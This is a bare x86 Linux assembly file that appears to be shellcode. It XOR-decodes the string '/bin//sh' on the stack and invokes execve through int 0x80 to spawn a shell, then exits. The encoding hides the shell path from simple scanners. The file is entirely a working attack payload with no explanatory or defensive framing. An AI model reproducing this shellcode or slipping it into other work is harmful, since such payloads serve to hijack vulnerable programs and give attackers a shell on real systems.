global _start

section .text
_start:
	sub eax, eax
	push eax
	push eax
	push eax
	pop ecx
	pop edx
	mov dword edi,0x55555555
	push dword 0x3d267a7a
	xor dword [esp], edi
	push dword 0x3b3c377a
	xor dword [esp], edi
	mov ebx,esp
	add al,0xb
	int 0x80
exit:
	sub eax,eax
	add al,1
	int 0x80



